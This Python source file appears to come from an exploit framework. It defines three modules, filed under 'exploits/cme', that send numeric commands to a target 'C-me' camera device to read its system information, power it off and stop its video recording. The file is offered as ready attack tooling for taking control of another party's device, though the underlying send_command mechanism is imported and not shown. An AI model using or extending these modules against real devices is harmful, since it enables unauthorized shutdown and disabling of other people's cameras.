# -*- coding: UTF-8 -*-
from generic import CmeFunctionality


class GetSysInfo(CmeFunctionality):
    """
    Get system information from the target C-me.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    path = "exploits/cme"
    
    def run(self):
        self.logger.info("Requesting system information...")
        r = self.send_command(0, -1)
        self.logger.success(r)  # FIXME: failure/success in function of r


class PowerOff(CmeFunctionality):
    """
    Power off the target C-me.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    path = "exploits/cme"
    
    def run(self):
        self.logger.info("Shutting down the target...")
        r = self.send_command(32, 0)
        self.logger.success(r)  # FIXME: failure/success in function of r


class StopVideo(CmeFunctionality):
    """
    Stop video recording of the target C-me.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    path = "exploits/cme"
    
    def run(self):
        self.logger.info("Stopping video...")
        r = self.send_command(47, 0)
        self.logger.success(r)  # FIXME: failure/success in function of r
